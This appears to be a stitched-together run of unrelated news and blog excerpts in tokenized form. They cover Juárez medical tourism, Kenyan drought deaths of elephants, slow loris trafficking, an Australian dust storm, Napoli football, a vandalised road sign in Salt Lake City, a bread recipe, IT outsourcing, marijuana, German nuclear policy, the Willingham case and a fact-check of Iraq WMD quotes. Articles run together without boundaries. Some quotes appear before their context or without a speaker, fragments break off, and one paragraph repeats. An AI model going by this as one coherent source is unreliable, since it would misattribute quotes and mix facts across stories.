Long a nexus for drug runners vying for control of smuggling routes , it has earned a reputation for gunfights , abductions , and murdered women .
In recent weeks , the violence fueled by drug cartels has spiked , and not for the first time .
There have been beheadings , public shootouts , and murders of dealers , police , and bystanders .
The U.S. Consulate has issued a travel advisory for the area .
And , in the midst of all this , Juárez has a message for you : Looking for a good deal on heart surgery ?
The city of 1.6 million is one of a few Mexican border towns quietly promoting state - of - the - art hospitals that cater to international patients -- Juárez has five such facilities -- and betting that refugees from the tattered U.S. health care system will come .
On paper , at least , the numbers look promising : According to a 2008 study by Deloitte LLP , 750,000 Americans traveled abroad for medical care in 2007 .
That number is expected to reach six million by 2010 .
This past spring , around the time Mexican President Felipe Calderón sent thousands of troops to Juárez in an attempt to quell a surge in violence , I met with Alvaro Navarro .
The director of economic development for Juárez , he is the man pushing the city ’s medical - tourism dreams .
Tall , handsome , and seemingly undeterred by the long odds , Navarro works out of an office in one of the city ’s few modern glass buildings .
As he described it to me , the plan was simple :
Woo tourists -- at last count , Mexico was among the world ’s top ten destinations -- to come for medical procedures and help them arrange sightseeing trips while they are there .
He spoke in the sly tone of a man who ’d just gotten in on the ground floor of something really huge .
“ Medical tourism -- it ’s going to be bigger than the maquila , ” he said , referring to the foreign - owned factories that dot Juárez .
“ The United States is the biggest client , ” he went on .
“ Or , should I say , the biggest patient . ”
Navarro escorted me to a conference room to show me what he meant .
His assistant , a young , pretty brunette , switched off the lights and guided us through a slideshow .
A jumble of PowerPoint charts and graphs compared prices in Mexico with those in the United States and Asia .
Mexico fell somewhere in between .
A heart - bypass operation that runs $ 130,000 in the United States would be about $ 9,000 in India and $ 25,000
in Mexico .
But , add a $ 1,200 plane ticket , a 30 - hour round - trip flight , and the cultural foreignness factor to the mix , and driving to Mexico might just beat flying to Asia .
The presentation ended with a preview of Juárez ’s new but still rudimentary and Spanish - only website , which Navarro said would eventually serve the entire border area .
With millions of dollars in government support and private capital , other Mexican cities -- places like Tijuana - - are also gearing up to attract patients .
The private - public nature of this venture sidesteps what some experts say is a pitfall that developing nations , where millions often do n’t have access to proper health care , can face .
“ The last thing that the government wants is to be seen investing in medical tourism , which is health care for [ the ] rich , while domestically , they are not providing sufficient health care , ” says Milica Bookman , co-author of Medical Tourism in Developing Countries and an economics professor at Saint Joseph ’s University in Philadelphia .
Though Mexico constitutionally guarantees the right to health care , underfunded public health institutions tend to offer substandard care , and many Mexicans ca n’t afford the private alternatives .
" It may be related to climate change , and the effect is elephants , particularly the young and the old , have began to die , " he told AP Television News on Monday .
" When they do not have enough food they also seem to be vulnerable to disease , their immune system weakens and they catch all sorts of diseases . "
Zoologist Iain Douglas - Hamilton , who founded Save the Elephants , said the drought is the worst he has seen in 12 years and poses a serious threat to the large and majestic animals , whose striking silhouettes roaming Kenya 's broad savannah help draw 1 million tourists each year .
The bones of the elephants bleaching under a relentless African sun underscore how bad the drought is .
It has killed hundreds of cattle and many acres of crops , threatening the lives of people who depended on them for food .
There are no tallies of deaths among people attributed to the drought but the U.N. 's World Food program said recently that 3.8 million Kenyans are at risk and need emergency food aid .
A drought in Kenya has gotten so bad that it is felling even the giants of the animal kingdom -- the country 's famed elephants which are dying as rivers dry up and grasslands shrivel in parched game reserves .
Elephants , which have no predators , must roam widely to get their daily ration of as much as 52 gallons of water and about 660 pounds of grass , leaves and twigs .
But the water is disappearing and the grass is all but gone .
In the Samburu National Reserve , APTN video showed a baby elephant appearing to struggle to extract moisture from a dry riverbed .
It repeatedly drew its empty trunk up to its mouth .
Along the banks of a river in the shadow of Mount Kenya , whose glaciers have been shrinking , an elephant 's carcass lay in the baking sun .
A dirt field was littered with elephant bones .
In the past two months , over 40 elephants have died in Laikipia , Isiolo and Samburu districts , the Daily Nation newspaper reported .
It was initially thought to be a disease outbreak but laboratory tests failed to detect disease .
The only probable reason the animals are dying is drought , Moses Litoloh , a senior scientist with the Kenya Wildlife Service , told the newspaper .
" Preliminary investigations reveal that the elephants have not been getting enough fodder , especially the young ones , " he said .
" Young elephants are unable to keep up the pace with their mothers while grazing .
They are also not able to browse tall trees which are the only source of food left . "
The species is hardly at the brink of extinction -- there are 23,000 elephants in Kenya and fewer than 100 have died from the drought -- but wildlife experts say they are concerned .
Making matters worse , herders are driving their livestock into the elephants ' domain in search of fresh pasture and competing for forage .
Prime Minister Raila Odinga last month warned of a " catastrophe " if seasonal rains do n't come in October and November .
Kenya 's grain harvest is expected to be 28 percent lower .
Food prices have jumped by as much as 130 percent .
The WFP has called for US $ 230 million in donations to feed hungry Kenyans .

For such an impossibly cute creature , the slow loris has it tough .
The giant - eyed nocturnal primates , found across a belt of countries around Indonesia , are highly prized for their supposed medicinal and spiritual properties .
As a result , the luckless lorises frequently find themselves roasted alive over wood fires while eager people catch the supposedly life - giving liquor that drips out .
Bits of their bodies are used in traditional medicine .
And legend has it that villagers anxious about traffic safety need only bury a loris beneath a new road to keep it free from accidents .
It gets worse .
The slow loris is the world 's only venomous primate .
Its venom is stored in an elbow patch : the loris will suck in the venom from the patch , then mix it around in its mouth before delivering a toxic bite .
So , when illegal traders catch them and sell them on , they usually remove the hapless creatures ' teeth - with wire cutters .
If ever an animal needed to be fast , it is the slow loris .
Unfortunately ... well you 've probably guessed .
" They wo n't run off like squirrels , " says Alan Knight , chief executive of International Animal Rescue , a UK charity .
" They 're more like sloths .
Even when we 're transporting them , they will wake up and slowly look around the box .
Then they might get up and have a wander around . "
International Animal Rescue is trying to decide what to do with the 31 toothless slow lorises it has collected from concerned tourists and sting operations on illegal market traders in Indonesia .
Together with five that still have their teeth , the creatures are housed in a sanctuary on the island of Java .
The charity , which works across the world to save animals such as the infamous dancing bears of India , usually tries to release rescued animals back to the wild .
" But we just do n't know whether these lorises will be able to survive without their teeth , " Knight says .
The group needs money to pay a research student to investigate the secretive animals ' diet and habits , and work out how they might be affected by the missing molars .
Some lorises can survive on little more than tree sap , Knight says .
Others have been seen at the rescue centre hunting gecko lizards and birds .
No teeth required .
" They sneak up on the birds , grab them and then strangle them with their hands and feet , " Knight says .
" This is totally new stuff .
Nobody has looked at this before . "

Experts say a huge orange dust storm rolling through Australia 's east coast is lining up to become one of the largest on record .
The storm is a major health hazard for people with lung problems and is stripping valuable topsoil from farms .
It has swept up enough dust every hour to fill thousands of semi-trailers and has blanketed Sydney in a grainy haze , disrupting air traffic and port operations .
Dr John Leys , the southern program coordinator of scientific program Dust Watch , says it is the worst measured storm in seven years of monitoring and the largest to reach Sydney since the 1960s .
However , he says radio callers are correct in pointing out that dust storms used to be more common .
" There used to be a lot more dust storms more frequent in the past and they were like this , but they often did n't come this far into Sydney , " he said .
" In fact , the number of dust storms was getting less and less through time .
" Certain parts of the landscape will suffer nutrient loss and soil loss - some of those wo n't recover but the vast majority will .
It is not a complete disaster . "
Dr Leys says a number of dust storms have been raging in South Australia for several weeks and have now pushed out towards the east coast .
But he says land management is constantly improving , which is helping to reduce the impact of dust storms .
Concern for agriculture
Judith Hams , who lives on a farm about 100 kilometres from Broken Hill , says the dust storms have had a huge impact .
" We were really dry , we 've only had about 70 millimetres for the year and we were starting to feed stock , " she said .
" We also sold a lot of our stock because of the drought and most of the little bits of grass that were trying to grow and herbage that was trying to survive will be destroyed with the wind from last night .
It was just a cutting wind that took everything with it . "
Stephen Cattle , a senior lecturer of soil science at Sydney University , says that is a real concern for agriculture .
" The top soil is often some of the better soil because lower down the soil becomes a bit more salty , a bit more sodium rich and not so hospitable for plant growth , " he said .
" So by losing the top soil in particular , where most of our organic matter resides , most of our organic carbon resides , it represents quite a loss to the potential productivity of that soil . "
Dr Cattle says overgrazing can cause disruption of the topsoil , but if farmers do not over - cultivate the land , the storm will be better able to resist wind erosion .
" I think we pretty much all understand that Australia is generally an arid continent and so from time to time , when the rain does n't fall and the wind howls , then these dust storms are going to occur , " he said .
" So to an extent we can control the severity of these storms , but at the end of the day nature will always win . "

This week , the manager who is under more pressure than Mark Hughes
Believe it or not , there might just be a manager out there under even more insufferable pressure to deliver than Manuel Pellegrini or Mark Hughes .
Napoli might not have been quite so lavish in their squad refurbishments this summer as Real Madrid or Manchester City , but Roberto Donadoni is working for a man who is putting his money and equally substantial mouth towards turning his boyhood club into a fairy story .
Napoli are owned by the flamboyant movie mogul Aurelio De Laurentiis , the local hero who rescued his club from bankruptcy in 2004 , relaunched them in Serie C , pushed them up and up , and now appears to expect nothing less than a serious tilt at the Scudetto .
Napoli and Genoa , two of the faded old names of calcio who are undergoing a renaissance , both spent heavily this summer in an attempt to catch up with the big boys .
De Laurentiis outlined his intentions by throwing a glitzy ceremony on board the Costa Concordia , a cruise ship moored in the dock of Naples , to unveil this season 's reinforced team .
It was a party worthy of Hollywood , with nine new signings topping the bill .
Fabio Quagliarella , the predatory striker signed from Udinese on the opening day of the transfer window , was particularly excited .
A prodigal son returning to the city of his birth , he is the man Napoli expect to lead the charge .
He turned down more lucrative offers , explaining , " I had always longed to come and play in Napoli . "
But the real Oscar moment came when De Laurentiis planted a kiss on the cheek of Ezequiel Lavezzi , the darling of the curva who had dangerously crossed swords with the owner .
De Laurentiis was incensed when the maverick Argentinian front man asked for a pay rise , and accused him of being overly dedicated to the art of parties , rather than doing his scoring on the pitch .
" Tonight starts my new five - year era at the club , " announced De Laurentiis from the Costa Concordia .
" This is a key time for Napoli and we can't afford any more errors . "
By his standards , this rallying call was uncharacteristically polite .
Sometimes De Laurentiis can come across as his club 's biggest fan and worst critic in the same sentence .
Donadoni did the right thing by publicly thanking De Laurentiis for the " great party " but it is hard to escape the feeling that the former Italy coach would prefer to get on with the job at hand more quietly .
Not easy .
The club has a personality that barely recognises the concept of quiet .
Anyone who has ever had the pleasure of watching a match at the San Paolo can appreciate that .
There is something feisty , fruity , and unmistakably hot blooded about the Napoli experience .
No wonder it was such a perfect marriage with Diego Maradona , back in the Scudetto - winning era of 1990 .
Donadoni is , however , absolutely correct to appeal for caution about the season ahead .
" I would leave expectations aside for now , " he said .
" I understand the euphoria surrounding this side , but we must be calm .
The squad has certainly been reinforced with interesting players , but aside from Quagliarella , they do n't have much experience .
The overall quality of the team has been increased , but I do n't like to make proclamations .
We need to be solid . "
The coach also mentioned recently that he could still do with somebody on the left , which merely provoked De Laurentiis to snarl , " If he wants one , he can buy it himself . "
If success can grow from this potent Neapolitan cocktail of tension and anticipation , then Donadoni will have earned his wages big time .
Napoli's progress should be worth keeping an eye on , and luckily for English viewers , live Serie A is back on our screens this season .
ESPN has struck a deal to add the Italian league to its stable , and will open the season on 22 August with Siena v Milan , who have lost a worrying six pre-season matches .
Yes , that 's right .
Six defeats in one summer .
Donadoni might think the title is a long shot , as Inter and an upgraded Juventus squad both look powerful , but a top three finish is not beyond the realms of possibility .
His old team Milan could be there for the taking .
Does Nick George , a Montgomery County native , have the look of a terrorist ?
" I understand I might warrant a second look , " he says .
" They should have taken me aside , seen I had a legitimate explanation and a student ID and that I was carrying nothing illegal , and waved me on . "

SALT LAKE CITY -- Someone spread an anti-religion message Wednesday morning by tampering with technology , and the person used a construction sign to get the message across .
" That 's just not something that you necessarily want to see every day , painted on billboards or even on construction signs like this , " said Trent Christensen , who was driving north on Foothill Boulevard Wednesday morning .
The words in lights caught his attention .
A road sign flashed a message that had nothing to do with construction .
" I just had to take a photo , " Christensen said .
His pictures show the anti-religion message , displayed on the sign .
" It said : ‘ It 's official .
God does not exist , ' " Christensen said .
Ironically , the sign sits next to an LDS church building .
" Either someone did it as a prank or someone did it as a malicious attack on someone 's theology , " Christensen said .
Whatever the reason , many drivers saw it .
Some called the Utah Department of Transportation 's Traffic Operations Center , but they did n't give the correct address .
So , by the time crews turned it off , the message had been flashing for several hours .
" You leave that question in your head : Who did it and how did they do it ' "
UDOT spokesman Adan Carrillo admits it is n't that hard to break into a variable message sign .
" Once you get into them , you can type just about anything you want in them , " Carillo said .
The sign on Foothill typically displays a warning to drivers to expect delays , while crews repave 1300 East to Sunnyside Avenue .
UDOT says it 's something that should n't be tampered with .
" It 's very frustrating for us because we do just about anything that we can possibly do to make sure that all of our construction zones are safe , " Carillo said .
Carrillo says this type of vandalism is against the law and does n't happen often .
He said this is the second time in the past five years .
UDOT is considering putting bigger locks on the signs and displaying them in well - lit areas to deter this from happening again .
The department encourages motorists to report any suspicious activity .

when i was much , much younger , one of my sisters and i came across a bowl of what looked to be delicious cookie dough in a mixing bowl on the kitchen counter .
with my mom out of the room at the moment , we took the opportunity to scoop up huge gobs and wolf them down , only to find out that what we thought was cookie dough was in fact cheese bread dough .
i do n’t care how much you like cheese , eating raw cheese bread dough is not a pleasant experience .
it did n’t ruin cheese as a whole for me , but i could n’t bring myself to eat cheese bread for a long time .
it was n’t until years later that i accidentally ate an asiago cheese bagel and realized it can be one of the finer things in life .
when i stumbled across this recipe last week for cheddar bread in Artisan Bread in 5 Minutes a Day , i decided to give it a shot .
it happened to be the same day the girl brought home a whole mess of farmer ’s market tomatoes to roast , so we figured , why not ?
making roasted tomatoes is staggeringly easy .
here they are at stage one : the tomatoes are happy and healthy on a baking sheet , doused with olive oil , salt and pepper , and ready for a 300 F oven .
stage two : 3 hours have passed , and the tomatoes are looking a little tired .
you can see where this is headed .
you could stop now , but we ’ve only just started to see the potential locked inside these little beauties .
stage three : 6 hours have passed , and the tomatoes have become something else entirely , caramelized and flavor - concentrated beyond words .
it ’s amazing what a little time and heat can produce .
eat them straight off the pan , toss with some fresh pasta or add to cheese bread dough and enjoy ( once you ’ve baked it , of course ) .
the bread is versatile , good enough toasted with a bit of butter , with hints of cheese and tomato throughout , but even better in sandwiches .
the recipe below produces a bread with flavors that are n’t too overwhelming , but if you ’re a cheese or tomato junky , adjust accordingly .

You may not have heard of Adam Marsland .
You may not have heard of his former band , Cockeyed Ghost .
But as we ’ve tried to demonstrate , time and time again , that does n’t necessarily mean anything .
Radio is a wasteland , the RIAA is waging a toxic war on the artist , and the explosion of media and Internet channels has so fractured and nichified the listening audience that the Second Coming of The Beatles probably would n’t be noticed by more than a few hundred people .
Upshot : there ’s a lot of great music out there that you and I have n’t discovered yet ( although I ’m searching as hard as I can ) .
So today we call your attention to Mr. Marsland , a Southern California indie / pop undergrounder whose new double CD actually is making some noise , hitting the Amazon.com best seller charts on the day it dropped .
Adam covers a lot of ground in this release , and at times he ’ll remind you of everyone from early Elton John to Todd Rundgren to The Beach Boys to Stevie Wonder – a range that calls to mind the stellar ( and also not very well known ) Lewis Taylor , although Marsland ’s funk vibe is more upbeat .
I talked with Adam recently and he was so obviously excited about Go West that he could barely contain himself .
“ Sam , this is the best CD I ’ve ever done . ”
I think he ’s right , too .
It is n’t his first really good record by any stretch , but the range , the confidence , the songcraft and the sheer excellence of the performances make Go West the yardstick by which the rest of his catalog , past and future , will be measured .
In another day and age you would n’t be hearing about this disc on a blog like S&R .
You ’d be listening to it on your local radio station .

Facebook wants to be the operating system for the web , it says , and this week ’s changes to its email system are a tiny part of that puzzle ....
You 'll get a better idea by watching the video below of how it works .
As you can see , its a bit like a Segway but unlike a Segway , the U3 - X can move in all directions just by leaning ones body weight .
I used to work as a field analyst at the studio / corporate headquarters for a large entertainment conglomerate in California .
As is common in dealing with end - users , a lot of the issues we dealt with had to do with locked accounts and expired passwords .
All of the field analysts had admin rights on the domain so that we could unlock accounts and reset passwords in a timely fashion .
No third party had to be involved , and folks were able to get back to work very quickly .
Most of us developed close working relationships with our end -users , and it was good public relations to have a familiar voice answer the phone when users called IT .

This system worked pretty well .
We analysts were able to set our own priorities for basic support issues , our users were able to get back to work quickly , and IT management rarely had to get involved with day - to - day support -- things got done and everyone liked it that way .
Everyone , that is , except top management and the bean counters -- they wanted to cut operating costs and , in their words , the " lowest hanging fruit " was the IT department .
Enter the outsourcing trend to the scene .
As part of the search for an IT outsourcing provider , management had prospective companies engage in a reverse bidding war .
Most of the IT staff referred to this as " selling us off to the lowest bidder . "
In a further demonstration of the disconnect between " business savvy " and " IT best practices , " upper management decided to split the outsourcing contract to save money .
There were surprisingly few layoffs , and most of the conglomerate 's IT staff were merely transitioned to the two outsource providers .
Those of us who provided end - user support were outsourced to one provider , and those who worked for server administration were outsourced to another , thereby creating the most cumbersome IT structure possible .
As the go - live date for the switchover loomed , we were fed the usual lines : " your job will not change " and " only the company name on your check will be different . "
Of course , in reality this could n't have been further from the truth .
All of the field analysts and system admins left on Friday as employees of the conglomerate , and came back on Monday working for different on - site vendors .

For us field analysts , domain admin rights were taken away and users were instructed to contact the new help desk -- physically located in a different state -- for all computing issues .
Gone was the familiar voice and customized service for users .
In its place was a faceless voice reading from a cookie - cutter script and absolutely no practical knowledge of our day - to - day operations .
Here 's the kicker :
Because analysts and admins were now employees of different vendors , we were forbidden by our respective management to speak to each other directly .
All communication was to be done via the tracking database in the tickets that were created by the out - of - state help desk .
Since most of us were physically located in the same complex , it was an extremely frustrating situation .
There were several times when an issue would come across our desk and we could see the guy at the other end of the cubicle farm who could resolve it , but we were forbidden to take it to him directly .
Confusion reigned and productivity plummeted as tickets were misrouted and lost , areas of responsibility were disputed , issues were diagnosed incorrectly , and descriptions were incomplete , inaccurate , or nonexistent .
Work - stopping issues that should have been easily and quickly resolved spent days or even weeks getting shuffled around to the wrong departments and / or passed back and forth between the two outsource providers .
In the case of expired passwords , for instance , an issue that at one time had been easily resolved in less than 15 minutes with one phone call became a weeks - long testament to inefficiency and corporate BS .
Word of the massive " Charlie Foxtrot " spread , and our competitors began referring to us by name as an IT model to be avoided at all costs .
Both analysts and admins voiced their frustrations , and many offered ideas to make the chaotic situation better , but to no avail .
In fact , in an absurd twist the more vocal of us were labeled as " not team players " because we spoke up about the futility of the system they had put in place .
Of course I got out of there as soon as I could .
Recently I found a list of the worst CEOs in America , and the head of the company I had been outsourced to was ranked as one of the top 10 worst CEOs in the country .

The LA Times profiles the normalization of pot :
After decades of bubbling up around the edges of so - called civilized society , marijuana seems to be marching mainstream at a fairly rapid pace .
At least in urban areas such as Los Angeles , cannabis culture is coming out of the closet .
At fashion - insider parties , joints are passed nearly as freely as hors d'oeuvres .
Traces of the acrid smoke waft from restaurant patios , car windows and passing pedestrians on the city streets -- in broad daylight .
Even the art of name - dropping in casual conversation -- once limited to celebrity sightings and designer shoe purchases -- now includes the occasional boast of recently discovered weed strains such as " Strawberry Cough " and " Purple Kush . "
Public sentiment is more than anecdotal ; earlier this year , a California Field Poll found that 56 % of California voters supported legalizing and taxing marijuana .
Last month , voters in Oakland overwhelmingly approved a tax increase on medical marijuana sales , the first of its kind in the country , and Los Angeles Councilwoman Janice Hahn has proposed something similar for the City of Angels .
" In this current economic crisis , we need to get creative about how we raise funds , " Hahn said in a statement .
I recently moved to Los Angeles and I 'm still adjusting to all the medical marijuana stores - there are two within a mile of my apartment .
And it 's not just the dispensaries , with their parking lots full of fancy cars - it 's the Amsterdamesque attitude .
Light up a joint and people ask for a hit ; light up a cigarette and they give you a dirty look .
My hunch is that the normalization of marijuana is here to stay .
In recent years , there 's been increasing interest among scientists in cannabinoid receptors , which are the cell receptors activated when you inhale some THC , the active ingredient in marijuana .
( There 's a grand scientific tradition of naming cell receptors after the drugs that activate them , which is why you also have opiate receptors and nicotinic receptors .
For some still mysterious reason , a chemical in the tropical shrub cannabis sativa is able to perfectly mimic our natural neurotransmitters .
As Roger Nicoll , a neuroscientist at UCSF , puts it : “ The brain makes its own marijuana . ”
Smoking a joint just helps you make more of it . )
While these cannabinoid receptors have been targeted for the treatment of a wide variety of ailments and disorders , from obesity to chronic pain , I think they might hold the most promise for the treatment of anxiety .
There 's now good evidence that mice lacking a normal cannabinoid receptor have difficulty forgetting or unlearning fearful memories .
This suggests that endocannabinoids - the natural molecules in your brain that work like THC - help the brain get over the negative emotions triggered by past trauma .
Of course , this should n't be too surprising : Despite the fact marijuana was first cultivated almost 10,000 years ago , modern medicine has yet to find another substance that can melt away our fears with such slick efficiency .
Unlike Microsoft 's own Xbox 360 , the Rubik 's 360 is actually round .
Imagine that , right ?
Said device is about to be officially unveiled in Germany this week at a national toy show , and while many question its ability to recreate the wonder and amazement associated with the original Cube , puzzle aficionados the world over are still enthusiastic about giving it a go .
The unit features six balls trapped inside of three transparent plastic spheres ; in order to solve it , players must figure out how to get the internal balls " from an inner sphere into matching slots on the outer sphere by shaking them through a middle sphere that has only two holes . "
Sadly , we 'll have to wait until August before being perpetually frustrated by yet another Rubik 's invention , but needless to say , we 're pretty stoked to get irate later this year .

The future of Germany 's 17 nuclear power plants , due to be shut down by the early 2020s , is one of the major issues that separates Chancellor Angela Merkel 's center - right Christian Democrats from the center - left Social Democrats .
The CDU , along with the liberal Free Democrats ( FDP ) , would like to extend that deadline , a move that is opposed by the SPD and environmentalist Greens .
The issue has been largely ignored in pre-election campaigning for the Sept. 27 general election .
But that may now change with Saturday 's rally in Berlin , led by farmers from Wendland , a region in north - central Germany , where plans call for permanent waste disposal sites .
The SPD chancellor candidate , Frank - Walter Steinmeier , on Friday accused the CDU and FDP " of leading the country into an energy policy dead - end and endangering domestic security . "
But Merkel has said it 's too early to turn off the switch on all nuclear power in Germany .
" We can not phase out nuclear energy as quickly as some imagine , " Merkel said .
" But in the long term , that 's to say in the second half of the century , we will experience a large amount of renewable energy sources .
We are convinced that we will be able to stop using nuclear energy at some point . "
A divisive issue and maybe a rallying cry
Tractors heading to Berlin for Saturday 's rally
Political analysts have said that even though the dispute between the CDU and SPD has had little effect on the campaign , the nuclear issue could mobilize voters in both camps .
" So far , it has played almost no role at all , which is a bit surprising , considering it 's one of the few issues where the CDU and SPD are completely at odds , " said Dietmar Herz , a political scientist at Erfurt University .
The SPD and Greens point to polls showing that a majority of Germans - around 59 percent - oppose nuclear energy and want the plants shut down , while the CDU and FDP emphasize that until Germany has built up a significant infrastructure of alternative energies , nuclear power plants should remain on line .
In 2001 , the SPD - Green government under former Chancellor Gerhard Schroeder pushed through legislation to phase out the use of nuclear energy within two decades , despite protests from the industry and power utilities .
Germany at odds with most other developed countries
Nuclear waste is transported under heavy guard in special containers
The SPD and the Greens had hoped that Germany would lead the way into a " post - nuclear age , " but instead much of the developed world has embraced the use of nuclear power as part of a climate - friendly energy mix .
France , for example , gets 80 percent of its power from nuclear energy and even exports a significant amount of it to Germany .
Germany covers about 23 percent of its energy consumption with nuclear power , compared to 42 percent with coal - fired power stations , 14 percent with natural gas and 15 percent with renewable energy sources , such as wind , solar and thermal .
Nils Diedrich , a political scientist at Berlin's Free University , said he expects discussions about nuclear issue to heat up if Merkel is able to form a coalition with the Free Democrats after the September election .
" If the CDU and FDP do actually win power and push through an extension of nuclear power we 'll see a real battle , " he said .
" Then there will be massive demonstrations . "

I 've written about the Willingham case before .
For a detailed discussion of the flimsy case against Willingham that led to his execution , this diary from 2006 should suffice .
But briefly : the Texas fire marshals , using a combination of old wives ' tales and junk science , managed to take an accidental and tragic fire in which three little girls perished and turn it into a murder case , ginning up enough false evidence to convict the girls ' father and sentence him to death .
The errors in the forensics were discovered with plenty of time before the execution date , but Governor Rick Perry ( in the single most craven act of cowardice from a politician since Martin Sheen used a baby for a shield in " The Dead Zone " ) declined to intervene and to further his own career as a " tough on crime " politician allowed an innocent man to die by lethal injection .
Following the execution , the Innocence Project brought in a panel of fire experts ( including my father , seen here disproving another bad arson conviction ) to review the case , and they systematically undermined every scintilla of forensic evidence relied upon by Texas to obtain the conviction ( long story short , fire science changed dramatically in the 1990s , and Texas 's experts were still thinking it was the 70s ) .
Here 's where the story picks up : following some high - profile forensic screw - ups , including the Willingham case , the Texas Legislature in 2005 created a commission to investigate lab error , negligence , and misconduct among forensic experts .
Their first major review was the Willingham case .
The commission hired an outside firm to review the case materials and issue a report .
Their investigator , Craig Beyler , just released his findings , and his report is absolutely brutal :
In a withering critique , a nationally known fire scientist has told a state commission on forensics that Texas fire investigators had no basis to rule a deadly house fire was an arson -- a finding that led to the murder conviction and execution of Cameron Todd Willingham .

Among Beyler 's key findings : that investigators failed to examine all of the electrical outlets and appliances in the Willinghams ' house in the small Texas town of Corsicana , did not consider other potential causes for the fire , came to conclusions that contradicted witnesses at the scene , and wrongly concluded Willingham 's injuries could not have been caused as he said they were .
The state fire marshal on the case , Beyler concluded in his report , had " limited understanding " of fire science .
The fire marshal " seems to be wholly without any realistic understanding of fires and how fire injuries are created , " he wrote .
The marshal 's findings , he added , " are nothing more than a collection of personal beliefs that have nothing to do with science - based fire investigation . "

I 'm an abolitionist .
State - sponsored killing holds very little interest for me , and I do n't believe that governments ought to be in the business of executing their own citizens .
I 've met ( and spoken at length with ) people who 've faced wrongful conviction for murder , and I fail to see how their undeserved torment brought any justice to our society .
My family was touched by murder -- my uncle Joseph was shot in the head before I was born , and my grandfather 's anger stayed with him until his dying day .
I 've seen dear friends whose lives were shattered by the murder of loved ones , including one of my first English teachers , whose son was shot and killed while working the counter of a Burger King across the street from my elementary school .
Even people on this very site have lived through the nightmare of a murder in the family .
I think I understand the rage and pain and sorrow and madness that such a thing causes in those left to collect the pieces after the crime .
I 'm an abolitionist because murder is murder , whether the killing is done by citizens or by the state .
It 's up to our society to say , in as dispassionate a voice as possible , that murder is intolerable and will result in your expulsion from Eden into an institutional Hell for the rest of your sorry - ass life .
But even if you disagree with that -- even if you think that there are reasons that justify state - sanctioned killing -- you have to admit ( as Texas is poised to do , and as Illinois already has ) that we 're just not that good at executing only guilty people .
I 'm an abolitionist , and Texas 's murder of Cameron Todd Willingham is why you should be , too .

Sen. Jay Rockerfeller ( D , WV ) , Oct 10 , 2002 , “ He has systematically violated , over the course of the past 11 years , every significant UN resolution that has demanded that he disarm and destroy his chemical and biological weapons , and any nuclear capacity .
This he has refused to do . ”
Rep. Henry Waxman ( D , CA ) , Oct. 10 , 2002 .
“ In the four years since the inspectors left , intelligence reports show that Saddam Hussein has worked to rebuild his chemical and biological weapons stock , his missile delivery capability , and his nuclear program .
He has also given aid , comfort , and sanctuary to terrorists , including al Qaeda members .
It is clear , however , that if left unchecked , Saddam Hussein will continue to increase his capacity to wage biological and chemical warfare , and will keep trying to develop nuclear weapons . ”
Sen. Hillary Clinton ( D , NY ) , Oct 10 , 2002
“ We are in possession of what I think to be compelling evidence that Saddam Hussein has , and has had for a number of years , a developing capacity for the production and storage of weapons of mass
destruction .
“ [ W ] ithout question , we need to disarm Saddam Hussein .
He is a brutal , murderous dictator , leading an oppressive regime …
He presents a particularly grievous threat because he is so consistently prone to miscalculation .
And now he has continued deceit and his consistent grasp for weapons of mass destruction …
So the threat of Saddam Hussein with weapons of mass destruction is real …

Right !!!
Origins :
All of the quotes listed above are substantially correct reproductions of words uttered by various Democratic leaders regarding Iraqi leader Saddam Hussein ’s acquisition or possession of weapons of mass destruction .
However , as is typical of such lists , some of the quotes are truncated — and all of them are provided without context — so as to reinforce the author ’s point of view even when the proffered material does not fit it .
Namely , several of these quotes were
offered in the course of statements that clearly indicated the speaker was decidedly against unilateral military intervention in Iraq by the U.S. Moreover , several of the quotes offered antedate the four nights of airstrikes unleashed against Iraq by U.S. and British forces during Operation Desert Fox in December 1998 , after which Secretary of Defense William S. Cohen and Gen. Henry H. Shelton ( chairman of the Joint Chiefs of Staff ) announced the action had been successful in “ degrad[ing ]
Saddam Hussein ’s ability to deliver chemical , biological and nuclear weapons . ”
In the section below where we highlight these quotes , we ’ve tried to provide sufficient surrounding material to make clear the context in which the quotes were offered as well as include links to the full text from which they were derived wherever possible .
In February 1998 , politicians debated the Clinton administration ’s plans to launch air attacks against Iraq in an effort to coerce Saddam Hussein into cooperating with U.N. weapons inspectors .
As the Washington Post noted at the time :
Foreign leaders and diplomats may be urging restraint on the Clinton administration in the showdown with Iraq , but a growing chorus at home is calling for stronger measures than the air attacks currently being planned , with the objective of bringing down President Saddam Hussein .
Foreign leaders and diplomats may be urging restraint on the Clinton administration in the showdown with Iraq , but a growing chorus at home is calling for stronger measures than the air attacks currently being planned , with the objective of bringing down President Saddam Hussein .
Prominent members of the foreign policy establishment and some leading members of Congress say they are convinced that air attacks aimed at coercing the Iraqis into cooperating with U.N. weapons inspectors would not succeed , and would result in too narrow a victory even if they did .
Instead , they argue , the United States should go beyond the objective of curtailing Iraqi weapons programs and adopt a far - reaching strategy aimed at replacing the Baghdad regime .
Although they are far from consensus on what that strategy should be , a few openly advocate the possible use of U.S. ground forces , a much greater commitment than the options being pursued by the administration .
Many supporters of a more forceful strategy are conservative Republicans and longtime defense hard - liners , such as Senate Majority Leader Trent Lott ( R - Miss . ) and former Pentagon official Richard L. Armitage .
But they also include former representative Stephen J. Solarz ( N.Y. ) , a liberal Democrat who with former Pentagon official Richard Perle is circulating a letter in Congress and foreign policy circles seeking bipartisan support for a more ambitious policy .
In addition to a crushing bombing campaign or the possibility of ground troops , some advocates of tougher measures are suggesting seeking Iraq ’s expulsion from the United Nations , indicting Saddam Hussein as a war criminal , or blockading the port of Basra to halt illicit oil exports — an action that would infuriate Iran , which shares the Shatt al Arab waterway with Iraq .
Such moves , if made unilaterally , would almost certainly draw the ire of most of the United States ’s U.N. partners and frame the crisis even more starkly as a conflict between Washington and Baghdad .
But public opinion polls may indicate support for such a route .
A Los Angeles Times poll published on Monday showed that by 68 percent to 24 percent , Americans favor airstrikes provided they are designed to remove Saddam Hussein from power , not just force him to accept the commands of the U.N. Security Council .

That same article also reported a statement made by President Clinton the previous day ( 4 February 1998 ) :
Yesterday , Clinton reiterated that he would prefer a “ diplomatic solution ” to the standoff with Iraq but added , “ One way or the other , we are determined to deny Iraq the capacity to develop weapons of mass destruction and the missiles to deliver them .
That is our bottom line . ”
Clinton met with Secretary of State Madeleine K. Albright , just back from a trip to Europe and several Arab countries to outline the U.S. position , and is to discuss Iraq with British Prime Minister Tony Blair , who arrived in Washington yesterday .

On 17 February 1998 , President Clinton delivered a speech at the Pentagon .
Excerpts from that speech include the following comments :
